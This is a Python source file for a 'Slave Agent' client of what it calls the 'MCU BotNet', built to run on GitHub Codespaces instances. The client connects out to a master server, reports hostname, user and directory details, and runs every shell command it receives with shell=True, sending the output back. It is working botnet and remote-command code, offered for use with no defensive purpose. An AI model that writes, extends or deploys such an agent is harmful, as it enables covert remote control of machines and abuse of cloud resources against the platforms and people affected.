#!/usr/bin/env python3
"""
Slave Server - GitHub Codespaces Agent
Connects to main server and executes commands received from master.
Runs on GitHub Codespaces instances.
"""

import socket
import threading
import json
import subprocess
import time
import sys
import os
import platform
import uuid
from datetime import datetime
import argparse

class SlaveServer:
    def __init__(self, main_server_host, main_server_port=8000, slave_id=None):
        self.main_server_host = main_server_host
        self.main_server_port = main_server_port
        self.slave_id = slave_id or f"slave_{str(uuid.uuid4())[:8]}"
        self.socket = None
        self.connected = False
        self.running = True
        self.heartbeat_interval = 30  # seconds
        
        # Get system info
        self.system_info = self.get_system_info()
        
    def get_system_info(self):
        """Get system information"""
        try:
            return {
                'hostname': platform.node(),
                'platform': platform.platform(),
                'architecture': platform.architecture()[0],
                'processor': platform.processor(),
                'python_version': platform.python_version(),
                'working_directory': os.getcwd(),
                'user': os.getenv('USER', 'unknown'),
                'home': os.getenv('HOME', 'unknown')
            }
        except Exception as e:
            return {'error': str(e)}
    
    def connect_to_main_server(self):
        """Connect to the main server"""
        max_retries = 5
        retry_delay = 5
        
        for attempt in range(max_retries):
            try:
                print(f"[*] Attempting to connect to main server (attempt {attempt + 1}/{max_retries})")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.main_server_host, self.main_server_port))
                self.connected = True
                
                # Send registration message
                registration = {
                    'type': 'register',
                    'slave_id': self.slave_id,
                    'system_info': self.system_info,
                    'timestamp': datetime.now().isoformat()
                }
                self.send_message(registration)
                
                print(f"[+] Connected to main server at {self.main_server_host}:{self.main_server_port}")
                print(f"[+] Registered as slave: {self.slave_id}")
                
                # Start listening for commands
                threading.Thread(target=self.listen_for_commands, daemon=True).start()
                
                # Start heartbeat
                threading.Thread(target=self.heartbeat, daemon=True).start()
                
                return True
                
            except Exception as e:
                print(f"[-] Connection attempt {attempt + 1} failed: {e}")
                if attempt < max_retries - 1:
                    print(f"[*] Retrying in {retry_delay} seconds...")
                    time.sleep(retry_delay)
                    retry_delay *= 2  # Exponential backoff
        
        print("[-] Failed to connect to main server after all attempts")
        return False
    
    def send_message(self, message):
        """Send message to main server"""
        try:
            if self.socket and self.connected:
                data = json.dumps(message)
                self.socket.send(data.encode())
                return True
        except Exception as e:
            print(f"[-] Error sending message: {e}")
            self.connected = False
        return False
    
    def listen_for_commands(self):
        """Listen for commands from main server"""
        while self.connected and self.running:
            try:
                data = self.socket.recv(4096)
                if not data:
                    break
                
                message = json.loads(data.decode())
                self.handle_command(message)
                
            except Exception as e:
                print(f"[-] Error receiving command: {e}")
                break
        
        self.connected = False
        print("[-] Disconnected from main server")
    
    def handle_command(self, message):
        """Handle commands from main server"""
        msg_type = message.get('type')
        
        if msg_type == 'execute_command':
            command = message.get('command')
            command_id = message.get('command_id', 'unknown')
            
            print(f"[*] Executing command: {command}")
            result = self.execute_command(command)
            
            # Send result back
            response = {
                'type': 'command_result',
                'slave_id': self.slave_id,
                'command_id': command_id,
                'command': command,
                'result': result['output'],
                'status': result['status'],
                'return_code': result['return_code'],
                'timestamp': datetime.now().isoformat()
            }
            self.send_message(response)
            
        elif msg_type == 'get_info':
            # Send system info
            response = {
                'type': 'slave_info',
                'slave_id': self.slave_id,
                'system_info': self.system_info,
                'status': 'online',
                'timestamp': datetime.now().isoformat()
            }
            self.send_message(response)
            
        elif msg_type == 'ping':
            # Respond to ping
            response = {
                'type': 'pong',
                'slave_id': self.slave_id,
                'timestamp': datetime.now().isoformat()
            }
            self.send_message(response)
    
    def execute_command(self, command):
        """Execute shell command and return result"""
        try:
            # Execute command
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                timeout=300  # 5 minute timeout
            )
            
            output, _ = process.communicate()
            return_code = process.returncode
            
            return {
                'output': output,
                'return_code': return_code,
                'status': 'success' if return_code == 0 else 'error'
            }
            
        except subprocess.TimeoutExpired:
            process.kill()
            return {
                'output': 'Command timed out after 5 minutes',
                'return_code': -1,
                'status': 'timeout'
            }
        except Exception as e:
            return {
                'output': f'Error executing command: {str(e)}',
                'return_code': -1,
                'status': 'error'
            }
    
    def heartbeat(self):
        """Send periodic heartbeat to main server"""
        while self.connected and self.running:
            try:
                heartbeat_msg = {
                    'type': 'heartbeat',
                    'slave_id': self.slave_id,
                    'timestamp': datetime.now().isoformat()
                }
                self.send_message(heartbeat_msg)
                time.sleep(self.heartbeat_interval)
            except Exception as e:
                print(f"[-] Heartbeat error: {e}")
                break
    
    def disconnect(self):
        """Disconnect from main server"""
        self.running = False
        if self.connected and self.socket:
            try:
                disconnect_msg = {
                    'type': 'disconnect',
                    'slave_id': self.slave_id,
                    'timestamp': datetime.now().isoformat()
                }
                self.send_message(disconnect_msg)
            except:
                pass
        
        if self.socket:
            self.socket.close()
        self.connected = False

def print_banner():
    """Print ASCII banner"""
    banner = """
    ███████╗██╗      █████╗ ██╗   ██╗███████╗     █████╗  ██████╗ ███████╗███╗   ██╗████████╗
    ██╔════╝██║     ██╔══██╗██║   ██║██╔════╝    ██╔══██╗██╔════╝ ██╔════╝████╗  ██║╚══██╔══╝
    ███████╗██║     ███████║██║   ██║█████╗      ███████║██║  ███╗█████╗  ██╔██╗ ██║   ██║   
    ╚════██║██║     ██╔══██║╚██╗ ██╔╝██╔══╝      ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║   ██║   
    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗    ██║  ██║╚██████╔╝███████╗██║ ╚████║   ██║   
    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝   
    
                                Slave Agent v1.0
    """
    print(banner)

def main():
    parser = argparse.ArgumentParser(description='MCU BotNet Slave Server')
    parser.add_argument('--host', required=True, help='Main server host to connect to')
    parser.add_argument('--port', type=int, default=8000, help='Main server port (default: 8000)')
    parser.add_argument('--slave-id', help='Custom slave ID (auto-generated if not provided)')
    parser.add_argument('--daemon', action='store_true', help='Run as daemon (no interactive mode)')
    args = parser.parse_args()
    
    print_banner()
    
    slave = SlaveServer(args.host, args.port, args.slave_id)
    
    print(f"[*] Starting slave server...")
    print(f"[*] Slave ID: {slave.slave_id}")
    print(f"[*] Target main server: {args.host}:{args.port}")
    
    if not slave.connect_to_main_server():
        print("[-] Failed to connect to main server. Exiting.")
        return 1
    
    print("[+] Slave server started successfully!")
    print("[*] Waiting for commands from master...")
    
    if args.daemon:
        # Run as daemon
        try:
            while slave.connected:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Received interrupt signal")
    else:
        # Interactive mode
        print("Press Ctrl+C to stop the slave server.")
        try:
            while slave.connected:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Received interrupt signal")
    
    print("[*] Shutting down slave server...")
    slave.disconnect()
    print("[+] Slave server stopped.")
    return 0

if __name__ == "__main__":
    sys.exit(main())
